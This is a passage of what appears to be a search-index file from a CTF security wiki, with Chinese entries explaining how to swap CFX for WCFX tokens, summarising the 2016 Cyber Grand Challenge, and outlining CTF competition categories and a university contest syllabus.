\u4f7f\u7528Confluxscan\u5151\u6362cfx\u4e3awcfx\u7684\u65b9\u6cd5\uff08\u9700\u8981\u4ed8\u5b58\u50a8\u8d39\uff09 \u00b6 \u8bbf\u95ee \u5151\u6362\u94fe\u63a5 \uff0c\u53f3\u4e0a\u89d2\u8fde\u63a5\u94b1\u5305 \u8fde\u63a5\u94b1\u5305 \u7531\u4e8e\u5e0c\u671b\u7528cfx\u5151\u6362\u4e3awcfx\uff0c\u9700\u70b9\u51fb\u9875\u9762\u7bad\u5934 \u8f93\u5165\u5e0c\u671b\u5151\u6362\u7684cfx\u6570\u76ee \u70b9\u51fb\u5151\u6362\u6309\u94ae\uff0c\u5e76\u5728\u5f39\u51fa\u7684Portal\u4e2d\u70b9\u51fb\u786e\u8ba4\uff0c\u5151\u6362\u5b8c\u6210 \u4f7f\u7528moonswap\u5151\u6362cfx\u4e3awcfx\u7684\u65b9\u6cd5\uff08\u65e0\u9700\u652f\u4ed8\u5b58\u50a8\u8d39\uff09 \u00b6 \u8bbf\u95eemoonswap\u7684 swap\u6a21\u5757 \u7531\u4e8e\u6211\u4eec\u8981\u7528CFX\u6362WCFX\uff0c\u6240\u4ee5\u5356\u51fa\u91cc\u9009\u201cCFX\u201d\uff0c\u4e70\u5165\u91cc\u9009\u62e9\u201cWCFX\u201d \u8f93\u5165\u9700\u8981\u5356\u51fa\u7684CFX\u91cf \u70b9\u51fb\u5151\u6362\uff0c\u547c\u51faPortal\u786e\u8ba4\uff0c\u70b9\u51fb\u786e\u8ba4\u5373\u53ef Note \u200b \u5982\u679c\u53cd\u6094\u4e0d\u60f3\u5151\u6362cfx\u4e3awcfx\uff0c\u53ef\u4ee5\u76f4\u63a5\u70b9\u51fb\u62d2\u7edd\uff01","title":"WCFX\u4e0eCFX\u4ee3\u5e01\u4e92\u6362"},{"location":"ecosystem/wcfx-cfx-exchange/#wcfxcfx","text":"","title":"WCFX\u4e0eCFX\u4ee3\u5e01\u4e92\u6362"},{"location":"ecosystem/wcfx-cfx-exchange/#wcfx","text":"WCFX\u662f\u7ecf\u8fc7CRC20 wrapped\u5904\u7406\u8fc7\u7684CFX\uff0c\u539f\u5219\u4e0aWCFX\u4e0eCFX\u6309\u71671:1\u6bd4\u7387\u8fdb\u884c\u5151\u6362\uff0c\u901a\u5e38\u5728\u4f7f\u7528Tspace\u8fd9\u7c7b\u751f\u6001\u8d2d\u4e70\u7279\u5b9aNFT\u65f6\uff0c\u9700\u8981\u4f7f\u7528WCFX\u4f5c\u4e3a\u652f\u4ed8\u5e01\u79cd\u3002 WCFX\u4ee3\u5e01\u53ef\u901a\u8fc7Confluxscan\u67e5\u770b\uff1a Wrapped Conflux \u9700\u8981\u914d\u7f6eConfluxPortal\uff0c \u914d\u7f6e\u6559\u7a0b","title":"WCFX\u4ecb\u7ecd"},{"location":"ecosystem/wcfx-cfx-exchange/#cfxwcfx","text":"\u4f7f\u7528Confluxscan\u81ea\u5e26cfx-wcfx\u5151\u6362\u5668\u8fdb\u884c\u5151\u6362\uff1a \u5151\u6362\u94fe\u63a5 \u4f7f\u7528moonswap\u7684swap\u7cfb\u7edf\u8fdb\u884c\u5151\u6362\uff1a \u5151\u6362\u94fe\u63a5","title":"CFX\u4e0eWCFX\u4e92\u6362\u7684\u4e24\u79cd\u65b9\u5f0f"},{"location":"ecosystem/wcfx-cfx-exchange/#confluxscancfxwcfx","text":"\u8bbf\u95ee \u5151\u6362\u94fe\u63a5 \uff0c\u53f3\u4e0a\u89d2\u8fde\u63a5\u94b1\u5305 \u8fde\u63a5\u94b1\u5305 \u7531\u4e8e\u5e0c\u671b\u7528cfx\u5151\u6362\u4e3awcfx\uff0c\u9700\u70b9\u51fb\u9875\u9762\u7bad\u5934 \u8f93\u5165\u5e0c\u671b\u5151\u6362\u7684cfx\u6570\u76ee \u70b9\u51fb\u5151\u6362\u6309\u94ae\uff0c\u5e76\u5728\u5f39\u51fa\u7684Portal\u4e2d\u70b9\u51fb\u786e\u8ba4\uff0c\u5151\u6362\u5b8c\u6210","title":"\u4f7f\u7528Confluxscan\u5151\u6362cfx\u4e3awcfx\u7684\u65b9\u6cd5\uff08\u9700\u8981\u4ed8\u5b58\u50a8\u8d39\uff09"},{"location":"ecosystem/wcfx-cfx-exchange/#moonswapcfxwcfx","text":"\u8bbf\u95eemoonswap\u7684 swap\u6a21\u5757 \u7531\u4e8e\u6211\u4eec\u8981\u7528CFX\u6362WCFX\uff0c\u6240\u4ee5\u5356\u51fa\u91cc\u9009\u201cCFX\u201d\uff0c\u4e70\u5165\u91cc\u9009\u62e9\u201cWCFX\u201d \u8f93\u5165\u9700\u8981\u5356\u51fa\u7684CFX\u91cf \u70b9\u51fb\u5151\u6362\uff0c\u547c\u51faPortal\u786e\u8ba4\uff0c\u70b9\u51fb\u786e\u8ba4\u5373\u53ef Note \u200b \u5982\u679c\u53cd\u6094\u4e0d\u60f3\u5151\u6362cfx\u4e3awcfx\uff0c\u53ef\u4ee5\u76f4\u63a5\u70b9\u51fb\u62d2\u7edd\uff01","title":"\u4f7f\u7528moonswap\u5151\u6362cfx\u4e3awcfx\u7684\u65b9\u6cd5\uff08\u65e0\u9700\u652f\u4ed8\u5b58\u50a8\u8d39\uff09"},{"location":"introduction/cgc/","text":"CGC \u8d85\u7ea7\u6311\u6218\u8d5b \u00b6 \u672c\u8282\u5185\u5bb9\u6458\u81ea\u674e\u5eb7\u6559\u6388\u4e8e 2016 \u5e74 8 \u6708 17 \u65e5 ISC \u4e92\u8054\u7f51\u5b89\u5168\u5927\u4f1a\u6f14\u8bb2\u300a\u7f51\u7edc\u8d85\u7ea7\u6311\u6218\u8d5b\u4e2d\u7684\u6f0f\u6d1e\u53d1\u6398\u4e0e\u5229\u7528\u300b\u3002 CGC \u7f51\u7edc\u8d85\u7ea7\u6311\u6218\u8d5b\u662f\u5168\u7403\u9996\u6b21\u673a\u5668\u7f51\u7edc\u653b\u9632\u6bd4\u8d5b\uff0c\u6bd4\u8d5b\u8fc7\u7a0b\u5168\u81ea\u52a8\uff0c\u65e0\u4efb\u4f55\u4eba\u5de5\u5e72\u9884\u3002\u8003\u9a8c\u673a\u5668\u81ea\u52a8\u6f0f\u6d1e\u6316\u6398\u3001\u81ea\u52a8\u8f6f\u4ef6\u52a0\u56fa\u3001\u81ea\u52a8\u6f0f\u6d1e\u5229\u7528\u548c\u81ea\u52a8\u7f51\u7edc\u9632\u62a4\u6c34\u5e73\u3002\u4f7f\u7528\u7b80\u5316\u7684 Linux \u64cd\u4f5c\u7cfb\u7edf------DECREE\uff0c\u7c7b\u4f3c Snort\u7684\u89c4\u5219\u8fc7\u6ee4\u9632\u706b\u5899\u3002\u5bf9 Linux \u4e8c\u8fdb\u5236\u7a0b\u5e8f\u8fdb\u884c\u6f0f\u6d1e\u6316\u6398\u3002\u6240\u6709\u53c2\u8d5b\u961f\u90fd\u6ca1\u6709\u7a0b\u5e8f\u6e90\u7801\u3002 \u5728 2016 \u5e74\u7684 CGC \u6bd4\u8d5b\u4e2d\uff0c\u6311\u6218\u7684\u8d5b\u9898\u5305\u542b\u4e86 53 \u79cd CWE\u3002\u5176\u4e2d\u5305\u542b 28 \u4e2a\u5806\u6ea2\u51fa\u6f0f\u6d1e\u300124 \u4e2a\u6808\u6ea2\u51fa\u6f0f\u6d1e\u300116 \u4e2a\u7a7a\u6307\u9488\u8bbf\u95ee\u6f0f\u6d1e\u300113 \u4e2a\u6574\u6570\u6ea2\u51fa\u6f0f\u6d1e\u548c 8 \u4e2a UAF \u6f0f\u6d1e\u3002 \u653b\u9632\u8fc7\u7a0b\u7531\u7ec4\u7ec7\u65b9\u53d1\u51fa\u6311\u6218\u7a0b\u5e8f\uff0c\u5404\u56e2\u961f\u670d\u52a1\u5668\u53ef\u4ee5\u5411\u7ec4\u7ec7\u65b9\u63d0\u4f9b\u8865\u4e01\u7a0b\u5e8f\uff0c\u9632\u706b\u5899\u89c4\u5219\u548c\u653b\u51fb\u7a0b\u5e8f\u3002\u4fee\u8865\u8fc7\u7684\u7a0b\u5e8f\u548c\u9632\u706b\u5899\u89c4\u5219\u4f1a\u5206\u53d1\u7ed9\u5176\u4ed6\u56e2\u961f\u3002\u7ec4\u7ec7\u65b9\u4e3a\u6bcf\u4e2a\u56e2\u961f\u8fd0\u884c\u6311\u6218\u7a0b\u5e8f\uff0c\u8fdb\u884c\u670d\u52a1\u6d4b\u8bd5\u548c\u653b\u51fb\u5e76\u8fdb\u884c\u8bc4\u4f30\u3002 \u6027\u80fd\u8bc4\u4ef7\u6307\u6807 \u00b6 \u670d\u52a1\u6b63\u5e38\u8bbf\u95ee\u7684\u53cd\u5e94\u65f6\u95f4\uff1b \u6253\u8865\u4e01\u9891\u7387\uff1b \u52a0\u56fa\u7a0b\u5e8f\u7684\u6548\u7387\uff1b \u6210\u529f\u9632\u5fa1\u653b\u51fb\u7684\u6b21\u6570\u7edf\u8ba1\uff1b \u653b\u51fb\u6210\u529f\u6b21\u6570\u7edf\u8ba1\u3002 \u660e\u786e\u6838\u5fc3\u4efb\u52a1 \u00b6 \u62ff\u5230\u4e8c\u8fdb\u5236\u7a0b\u5e8f\uff0c\u8fdb\u884c\u81ea\u52a8\u5206\u6790\uff0c\u5728\u660e\u786e\u9632\u706b\u5899\u89c4\u5219\u540e\u5bf9\u7a0b\u5e8f\u8fdb\u884c\u52a0\u56fa\u5e76\u751f\u6210\u653b\u51fb\u7a0b\u5e8f\u3002 \u5206\u6790\u65b9\u6cd5 \u00b6 \u5177\u4f53\u6267\u884c-\u4f7f\u7528\u6b63\u5e38\u7684\u6267\u884c\u6a21\u5f0f\uff1b \u7b26\u53f7\u6267\u884c-\u8f85\u52a9 Fuzzing \u9636\u6bb5\u7684\u8def\u5f84\u9009\u62e9\uff1b \u6df7\u5408\u6267\u884c-\u5e26\u6709\u5177\u4f53\u8f93\u5165\u7684\u7b26\u53f7\u6267\u884c\uff0c\u6839\u636e\u8f93\u5165\u9009\u62e9\u8def\u5f84\uff0c\u4f46\u4fdd\u7559\u7b26\u53f7\u6761\u4ef6\u3002 CGC \u7ecf\u9a8c\u603b\u7ed3 \u00b6 \u5b8c\u7f8e\u9632\u5b88\u7684\u96be\u5ea6\u8fdc\u5927\u4e8e\u751f\u6210\u653b\u51fb\u7684\u96be\u5ea6\uff1b \u4e8c\u8fdb\u5236\u52a0\u56fa\u7a0b\u5e8f\u9700\u8981\u907f\u514d\u529f\u80fd\u635f\u5931\uff0c\u5e76\u6700\u5c0f\u5316\u6027\u80fd\u635f\u5931\uff1b \u5b89\u5168\u81ea\u52a8\u5316\u5904\u7406\u7684\u5927\u8d8b\u52bf\u5df2\u7ecf\u5f62\u6210\uff0c\u591a\u6570\u56e2\u961f\u53ef\u4ee5\u5728\u51e0\u79d2\u949f\u7684\u65f6\u95f4\u5bf9\u7b80\u5355\u5e94\u7528\u5f62\u6210\u653b\u51fb\u5e76\u751f\u6210\u6709\u6548\u9632\u5b88\uff1b \u5bf9\u6297\u4e2d\u7684\u7b56\u7565\u503c\u5f97\u7814\u7a76\uff0c\u6839\u636e\u81ea\u8eab\u548c\u5bf9\u624b\u7684\u653b\u9632\u80fd\u529b\uff0c\u5bf9\u8d44\u6e90\u548c\u52a8\u4f5c\u8fdb\u884c\u5408\u7406\u8c03\u6574\u3002","title":"CGC \u8d85\u7ea7\u6311\u6218\u8d5b"},{"location":"introduction/cgc/#cgc","text":"\u672c\u8282\u5185\u5bb9\u6458\u81ea\u674e\u5eb7\u6559\u6388\u4e8e 2016 \u5e74 8 \u6708 17 \u65e5 ISC \u4e92\u8054\u7f51\u5b89\u5168\u5927\u4f1a\u6f14\u8bb2\u300a\u7f51\u7edc\u8d85\u7ea7\u6311\u6218\u8d5b\u4e2d\u7684\u6f0f\u6d1e\u53d1\u6398\u4e0e\u5229\u7528\u300b\u3002 CGC \u7f51\u7edc\u8d85\u7ea7\u6311\u6218\u8d5b\u662f\u5168\u7403\u9996\u6b21\u673a\u5668\u7f51\u7edc\u653b\u9632\u6bd4\u8d5b\uff0c\u6bd4\u8d5b\u8fc7\u7a0b\u5168\u81ea\u52a8\uff0c\u65e0\u4efb\u4f55\u4eba\u5de5\u5e72\u9884\u3002\u8003\u9a8c\u673a\u5668\u81ea\u52a8\u6f0f\u6d1e\u6316\u6398\u3001\u81ea\u52a8\u8f6f\u4ef6\u52a0\u56fa\u3001\u81ea\u52a8\u6f0f\u6d1e\u5229\u7528\u548c\u81ea\u52a8\u7f51\u7edc\u9632\u62a4\u6c34\u5e73\u3002\u4f7f\u7528\u7b80\u5316\u7684 Linux \u64cd\u4f5c\u7cfb\u7edf------DECREE\uff0c\u7c7b\u4f3c Snort\u7684\u89c4\u5219\u8fc7\u6ee4\u9632\u706b\u5899\u3002\u5bf9 Linux \u4e8c\u8fdb\u5236\u7a0b\u5e8f\u8fdb\u884c\u6f0f\u6d1e\u6316\u6398\u3002\u6240\u6709\u53c2\u8d5b\u961f\u90fd\u6ca1\u6709\u7a0b\u5e8f\u6e90\u7801\u3002 \u5728 2016 \u5e74\u7684 CGC \u6bd4\u8d5b\u4e2d\uff0c\u6311\u6218\u7684\u8d5b\u9898\u5305\u542b\u4e86 53 \u79cd CWE\u3002\u5176\u4e2d\u5305\u542b 28 \u4e2a\u5806\u6ea2\u51fa\u6f0f\u6d1e\u300124 \u4e2a\u6808\u6ea2\u51fa\u6f0f\u6d1e\u300116 \u4e2a\u7a7a\u6307\u9488\u8bbf\u95ee\u6f0f\u6d1e\u300113 \u4e2a\u6574\u6570\u6ea2\u51fa\u6f0f\u6d1e\u548c 8 \u4e2a UAF \u6f0f\u6d1e\u3002 \u653b\u9632\u8fc7\u7a0b\u7531\u7ec4\u7ec7\u65b9\u53d1\u51fa\u6311\u6218\u7a0b\u5e8f\uff0c\u5404\u56e2\u961f\u670d\u52a1\u5668\u53ef\u4ee5\u5411\u7ec4\u7ec7\u65b9\u63d0\u4f9b\u8865\u4e01\u7a0b\u5e8f\uff0c\u9632\u706b\u5899\u89c4\u5219\u548c\u653b\u51fb\u7a0b\u5e8f\u3002\u4fee\u8865\u8fc7\u7684\u7a0b\u5e8f\u548c\u9632\u706b\u5899\u89c4\u5219\u4f1a\u5206\u53d1\u7ed9\u5176\u4ed6\u56e2\u961f\u3002\u7ec4\u7ec7\u65b9\u4e3a\u6bcf\u4e2a\u56e2\u961f\u8fd0\u884c\u6311\u6218\u7a0b\u5e8f\uff0c\u8fdb\u884c\u670d\u52a1\u6d4b\u8bd5\u548c\u653b\u51fb\u5e76\u8fdb\u884c\u8bc4\u4f30\u3002","title":"CGC \u8d85\u7ea7\u6311\u6218\u8d5b"},{"location":"introduction/cgc/#_1","text":"\u670d\u52a1\u6b63\u5e38\u8bbf\u95ee\u7684\u53cd\u5e94\u65f6\u95f4\uff1b \u6253\u8865\u4e01\u9891\u7387\uff1b \u52a0\u56fa\u7a0b\u5e8f\u7684\u6548\u7387\uff1b \u6210\u529f\u9632\u5fa1\u653b\u51fb\u7684\u6b21\u6570\u7edf\u8ba1\uff1b \u653b\u51fb\u6210\u529f\u6b21\u6570\u7edf\u8ba1\u3002","title":"\u6027\u80fd\u8bc4\u4ef7\u6307\u6807"},{"location":"introduction/cgc/#_2","text":"\u62ff\u5230\u4e8c\u8fdb\u5236\u7a0b\u5e8f\uff0c\u8fdb\u884c\u81ea\u52a8\u5206\u6790\uff0c\u5728\u660e\u786e\u9632\u706b\u5899\u89c4\u5219\u540e\u5bf9\u7a0b\u5e8f\u8fdb\u884c\u52a0\u56fa\u5e76\u751f\u6210\u653b\u51fb\u7a0b\u5e8f\u3002","title":"\u660e\u786e\u6838\u5fc3\u4efb\u52a1"},{"location":"introduction/cgc/#_3","text":"\u5177\u4f53\u6267\u884c-\u4f7f\u7528\u6b63\u5e38\u7684\u6267\u884c\u6a21\u5f0f\uff1b \u7b26\u53f7\u6267\u884c-\u8f85\u52a9 Fuzzing \u9636\u6bb5\u7684\u8def\u5f84\u9009\u62e9\uff1b \u6df7\u5408\u6267\u884c-\u5e26\u6709\u5177\u4f53\u8f93\u5165\u7684\u7b26\u53f7\u6267\u884c\uff0c\u6839\u636e\u8f93\u5165\u9009\u62e9\u8def\u5f84\uff0c\u4f46\u4fdd\u7559\u7b26\u53f7\u6761\u4ef6\u3002","title":"\u5206\u6790\u65b9\u6cd5"},{"location":"introduction/cgc/#cgc_1","text":"\u5b8c\u7f8e\u9632\u5b88\u7684\u96be\u5ea6\u8fdc\u5927\u4e8e\u751f\u6210\u653b\u51fb\u7684\u96be\u5ea6\uff1b \u4e8c\u8fdb\u5236\u52a0\u56fa\u7a0b\u5e8f\u9700\u8981\u907f\u514d\u529f\u80fd\u635f\u5931\uff0c\u5e76\u6700\u5c0f\u5316\u6027\u80fd\u635f\u5931\uff1b \u5b89\u5168\u81ea\u52a8\u5316\u5904\u7406\u7684\u5927\u8d8b\u52bf\u5df2\u7ecf\u5f62\u6210\uff0c\u591a\u6570\u56e2\u961f\u53ef\u4ee5\u5728\u51e0\u79d2\u949f\u7684\u65f6\u95f4\u5bf9\u7b80\u5355\u5e94\u7528\u5f62\u6210\u653b\u51fb\u5e76\u751f\u6210\u6709\u6548\u9632\u5b88\uff1b \u5bf9\u6297\u4e2d\u7684\u7b56\u7565\u503c\u5f97\u7814\u7a76\uff0c\u6839\u636e\u81ea\u8eab\u548c\u5bf9\u624b\u7684\u653b\u9632\u80fd\u529b\uff0c\u5bf9\u8d44\u6e90\u548c\u52a8\u4f5c\u8fdb\u884c\u5408\u7406\u8c03\u6574\u3002","title":"CGC \u7ecf\u9a8c\u603b\u7ed3"},{"location":"introduction/content/","text":"CTF \u7ade\u8d5b\u5185\u5bb9 \u00b6 \u7531\u4e8e CTF \u7684\u8003\u9898\u8303\u56f4\u5176\u5b9e\u6bd4\u8f83\u5bbd\u5e7f\uff0c\u76ee\u524d\u4e5f\u6ca1\u6709\u592a\u660e\u786e\u7684\u89c4\u5b9a\u754c\u9650\u8bf4\u4f1a\u8003\u54ea\u4e9b\u5185\u5bb9\u3002\u4f46\u662f\u5c31\u76ee\u524d\u7684\u6bd4\u8d5b\u9898\u578b\u800c\u8a00\u7684\u8bdd\uff0c\u4e3b\u8981\u8fd8\u662f\u4f9d\u636e\u5e38\u89c1\u7684 Web \u7f51\u7edc\u653b\u9632\u3001RE \u9006\u5411\u5de5\u7a0b\u3001Pwn \u4e8c\u8fdb\u5236\u6f0f\u6d1e\u5229\u7528\u3001Crypto \u5bc6\u7801\u653b\u51fb\u3001Mobile \u79fb\u52a8\u5b89\u5168 \u4ee5\u53ca Misc \u5b89\u5168\u6742\u9879 \u6765\u8fdb\u884c\u5206\u7c7b\u3002 Web - \u7f51\u7edc\u653b\u9632 \u4e3b\u8981\u4ecb\u7ecd\u4e86 Web \u5b89\u5168\u4e2d\u5e38\u89c1\u7684\u6f0f\u6d1e\uff0c\u5982 SQL \u6ce8\u5165\u3001XSS\u3001CSRF\u3001\u6587\u4ef6\u5305\u542b\u3001\u6587\u4ef6\u4e0a\u4f20\u3001\u4ee3\u7801\u5ba1\u8ba1\u3001PHP \u5f31\u7c7b\u578b\u7b49\uff0cWeb \u5b89\u5168\u4e2d\u5e38\u89c1\u7684\u9898\u578b\u53ca\u89e3\u9898\u601d\u8def\uff0c\u5e76\u63d0\u4f9b\u4e86\u4e00\u4e9b\u5e38\u7528\u7684\u5de5\u5177\u3002 Reverse Engineering - \u9006\u5411\u5de5\u7a0b \u4e3b\u8981\u4ecb\u7ecd\u4e86\u9006\u5411\u5de5\u7a0b\u4e2d\u7684\u5e38\u89c1\u9898\u578b\u3001\u5de5\u5177\u5e73\u53f0\u3001\u89e3\u9898\u601d\u8def\uff0c\u8fdb\u9636\u90e8\u5206\u4ecb\u7ecd\u4e86\u9006\u5411\u5de5\u7a0b\u4e2d\u5e38\u89c1\u7684\u8f6f\u4ef6\u4fdd\u62a4\u3001\u53cd\u7f16\u8bd1\u3001\u53cd\u8c03\u8bd5\u3001\u52a0\u58f3\u8131\u58f3\u6280\u672f\u3002 Pwn - \u4e8c\u8fdb\u5236\u6f0f\u6d1e\u5229\u7528 Pwn \u9898\u76ee\u4e3b\u8981\u8003\u5bdf\u4e8c\u8fdb\u5236\u6f0f\u6d1e\u7684\u53d1\u6398\u548c\u5229\u7528\uff0c\u9700\u8981\u5bf9\u8ba1\u7b97\u673a\u64cd\u4f5c\u7cfb\u7edf\u5e95\u5c42\u6709\u4e00\u5b9a\u7684\u4e86\u89e3\u3002\u5728 CTF \u7ade\u8d5b\u4e2d\uff0cPWN \u9898\u76ee\u4e3b\u8981\u51fa\u73b0\u5728 Linux \u5e73\u53f0\u4e0a\u3002 Crypto - \u5bc6\u7801\u653b\u51fb \u4e3b\u8981\u5305\u62ec\u53e4\u5178\u5bc6\u7801\u5b66\u548c\u73b0\u4ee3\u5bc6\u7801\u5b66\u4e24\u90e8\u5206\u5185\u5bb9\uff0c\u53e4\u5178\u5bc6\u7801\u5b66\u8da3\u5473\u6027\u5f3a\uff0c\u79cd\u7c7b\u7e41\u591a\uff0c\u73b0\u4ee3\u5bc6\u7801\u5b66\u5b89\u5168\u6027\u9ad8\uff0c\u5bf9\u7b97\u6cd5\u7406\u89e3\u7684\u8981\u6c42\u8f83\u9ad8\u3002 Mobile - \u79fb\u52a8\u5b89\u5168 \u4e3b\u8981\u4ecb\u7ecd\u4e86\u5b89\u5353\u9006\u5411\u4e2d\u7684\u5e38\u7528\u5de5\u5177\u548c\u4e3b\u8981\u95ee\u9898\u7c7b\u578b\uff0c\u5b89\u5353\u9006\u5411\u5e38\u5e38\u9700\u8981\u4e00\u5b9a\u7684\u5b89\u5353\u5f00\u53d1\u77e5\u8bc6\uff0ciOS \u9006\u5411\u9898\u76ee\u5728 CTF \u7ade\u8d5b\u4e2d\u8f83\u5c11\u51fa\u73b0\uff0c\u56e0\u6b64\u4e0d\u4f5c\u8fc7\u591a\u4ecb\u7ecd\u3002 Misc - \u5b89\u5168\u6742\u9879 \u4ee5\u8bf8\u845b\u5efa\u4f1f\u7ffb\u8bd1\u7684\u300a\u7ebf\u4e0a\u5e7d\u7075\uff1a\u4e16\u754c\u5934\u53f7\u9ed1\u5ba2\u7c73\u7279\u5c3c\u514b\u81ea\u4f20\u300b\u548c\u4e00\u4e9b\u5178\u578b MISC \u9898\u4e3a\u5207\u5165\u70b9\uff0c\u5185\u5bb9\u4e3b\u8981\u5305\u62ec\u4fe1\u606f\u641c\u96c6\u3001\u7f16\u7801\u5206\u6790\u3001\u53d6\u8bc1\u5206\u6790\u3001\u9690\u5199\u5206\u6790\u7b49\u3002 \u5168\u56fd\u5927\u5b66\u751f\u4fe1\u606f\u5b89\u5168\u7ade\u8d5b - \u7ade\u8d5b\u5185\u5bb9 \u00b6 2016 \u5e74\u5168\u56fd\u5927\u5b66\u751f\u4fe1\u606f\u5b89\u5168\u7ade\u8d5b\u5f00\u59cb\u4e3e\u529e\u521b\u65b0\u5b9e\u8df5\u6280\u80fd\u8d5b\uff0c\u91c7\u53d6\u7684\u5c31\u662f\u4f20\u7edf\u7684 CTF \u8d5b\u5236\u3002\u5728\u300a2016 \u5e74\u5168\u56fd\u5927\u5b66\u751f\u4fe1\u606f\u5b89\u5168\u7ade\u8d5b\u53c2\u8d5b\u6307\u5357\u300b\u4e2d\u4e3b\u529e\u65b9\u7ed9\u51fa\u7684\u7ade\u8d5b\u5185\u5bb9\u76f8\u5bf9\u5168\u9762\uff0c\u503c\u5f97\u53c2\u8003\u3002 \u7cfb\u7edf\u5b89\u5168\u3002\u6d89\u53ca\u64cd\u4f5c\u7cfb\u7edf\u548c Web \u7cfb\u7edf\u5b89\u5168\uff0c\u5305\u62ec Web \u7f51\u7ad9\u591a\u79cd\u8bed\u8a00\u6e90\u4ee3\u7801\u5ba1\u8ba1\u5206\u6790\uff08\u7279\u522b\u662f PHP\uff09\u3001\u6570\u636e\u5e93\u7ba1\u7406\u548c SQL \u64cd\u4f5c\u3001Web \u6f0f\u6d1e\u6316\u6398\u548c\u5229\u7528\uff08\u5982 SQL \u6ce8\u5165\u548cXSS\uff09\u3001\u670d\u52a1\u5668\u63d0\u6743\u3001\u7f16\u5199\u4ee3\u7801\u8865\u4e01\u5e76\u4fee\u590d\u7f51\u7ad9\u6f0f\u6d1e\u7b49\u5b89\u5168\u6280\u80fd\u3002 \u8f6f\u4ef6\u9006\u5411\u3002\u6d89\u53ca Windows/Linux/Android \u5e73\u53f0\u7684\u591a\u79cd\u7f16\u7a0b\u6280\u672f\uff0c\u8981\u6c42\u5229\u7528\u5e38\u7528\u5de5\u5177\u5bf9\u6e90\u4ee3\u7801\u53ca\u4e8c\u8fdb\u5236\u6587\u4ef6\u8fdb\u884c\u9006\u5411\u5206\u6790\uff0c\u638c\u63e1 Android \u79fb\u52a8\u5e94\u7528 APK \u6587\u4ef6\u7684\u9006\u5411\u5206\u6790\uff0c\u638c\u63e1\u52a0\u89e3\u5bc6\u3001\u5185\u6838\u7f16\u7a0b\u3001\u7b97\u6cd5\u3001\u53cd\u8c03\u8bd5\u548c\u4ee3\u7801\u6df7\u6dc6\u6280\u672f\u3002 \u6f0f\u6d1e\u6316\u6398\u548c\u5229\u7528\u3002\u638c\u63e1 C/C++/Python/PHP/Java/Ruby/\u6c47\u7f16 \u7b49\u8bed\u8a00\uff0c\u6316\u6398 Windows/Linux\uff08x86/x86_64 \u5e73\u53f0\uff09\u4e8c\u8fdb\u5236\u7a0b\u5e8f\u6f0f\u6d1e\uff0c\u638c\u63e1\u7f13\u51b2\u533a\u6ea2\u51fa\u548c\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u653b\u51fb\uff0c\u7f16\u5199\u5e76\u5229\u7528 shellcode\u3002 \u5bc6\u7801\u5b66\u539f\u7406\u53ca\u5e94\u7528\u3002\u638c\u63e1\u53e4\u5178\u5bc6\u7801\u5b66\u548c\u73b0\u4ee3\u5bc6\u7801\u5b66\uff0c\u5206\u6790\u5bc6\u7801\u7b97\u6cd5\u548c\u534f\u8bae\uff0c\u8ba1\u7b97\u5bc6\u94a5\u548c\u8fdb\u884c\u52a0\u89e3\u5bc6\u64cd\u4f5c\u3002 \u5176\u4ed6\u5185\u5bb9\u3002\u5305\u62ec\u4fe1\u606f\u641c\u96c6\u80fd\u529b\uff0c\u7f16\u7a0b\u80fd\u529b\u3001\u79fb\u52a8\u5b89\u5168\u3001\u4e91\u7aef\u8ba1\u7b97\u5b89\u5168\u3001\u53ef\u4fe1\u8ba1\u7b97\u3001\u81ea\u4e3b\u53ef\u63a7\u3001\u9690\u5199\u672f\u548c\u4fe1\u606f\u9690\u85cf\u3001\u8ba1\u7b97\u673a\u53d6\u8bc1\uff08Forensics\uff09\u6280\u672f\u548c\u6587\u4ef6\u6062\u590d\u6280\u80fd\uff0c\u8ba1\u7b97\u673a\u7f51\u7edc\u57fa\u7840\u4ee5\u53ca\u5bf9\u7f51\u7edc\u6d41\u91cf\u7684\u5206\u6790\u80fd\u529b\u3002","title":"CTF \u7ade\u8d5b\u5185\u5bb9"},{"location":"introduction/content/#ctf","text":"\u7531\u4e8e CTF \u7684\u8003\u9898\u8303\u56f4\u5176\u5b9e\u6bd4\u8f83\u5bbd\u5e7f\uff0c\u76ee\u524d\u4e5f\u6ca1\u6709\u592a\u660e\u786e\u7684\u89c4\u5b9a\u754c\u9650\u8bf4\u4f1a\u8003\u54ea\u4e9b\u5185\u5bb9\u3002\u4f46\u662f\u5c31\u76ee\u524d\u7684\u6bd4\u8d5b\u9898\u578b\u800c\u8a00\u7684\u8bdd\uff0c\u4e3b\u8981\u8fd8\u662f\u4f9d\u636e\u5e38\u89c1\u7684 Web \u7f51\u7edc\u653b\u9632\u3001RE \u9006\u5411\u5de5\u7a0b\u3001Pwn \u4e8c\u8fdb\u5236\u6f0f\u6d1e\u5229\u7528\u3001Crypto \u5bc6\u7801\u653b\u51fb\u3001Mobile \u79fb\u52a8\u5b89\u5168 \u4ee5\u53ca Misc \u5b89\u5168\u6742\u9879 \u6765\u8fdb\u884c\u5206\u7c7b\u3002 Web - \u7f51\u7edc\u653b\u9632 \u4e3b\u8981\u4ecb\u7ecd\u4e86 Web \u5b89\u5168\u4e2d\u5e38\u89c1\u7684\u6f0f\u6d1e\uff0c\u5982 SQL \u6ce8\u5165\u3001XSS\u3001CSRF\u3001\u6587\u4ef6\u5305\u542b\u3001\u6587\u4ef6\u4e0a\u4f20\u3001\u4ee3\u7801\u5ba1\u8ba1\u3001PHP \u5f31\u7c7b\u578b\u7b49\uff0cWeb \u5b89\u5168\u4e2d\u5e38\u89c1\u7684\u9898\u578b\u53ca\u89e3\u9898\u601d\u8def\uff0c\u5e76\u63d0\u4f9b\u4e86\u4e00\u4e9b\u5e38\u7528\u7684\u5de5\u5177\u3002 Reverse Engineering - \u9006\u5411\u5de5\u7a0b \u4e3b\u8981\u4ecb\u7ecd\u4e86\u9006\u5411\u5de5\u7a0b\u4e2d\u7684\u5e38\u89c1\u9898\u578b\u3001\u5de5\u5177\u5e73\u53f0\u3001\u89e3\u9898\u601d\u8def\uff0c\u8fdb\u9636\u90e8\u5206\u4ecb\u7ecd\u4e86\u9006\u5411\u5de5\u7a0b\u4e2d\u5e38\u89c1\u7684\u8f6f\u4ef6\u4fdd\u62a4\u3001\u53cd\u7f16\u8bd1\u3001\u53cd\u8c03\u8bd5\u3001\u52a0\u58f3\u8131\u58f3\u6280\u672f\u3002 Pwn - \u4e8c\u8fdb\u5236\u6f0f\u6d1e\u5229\u7528 Pwn 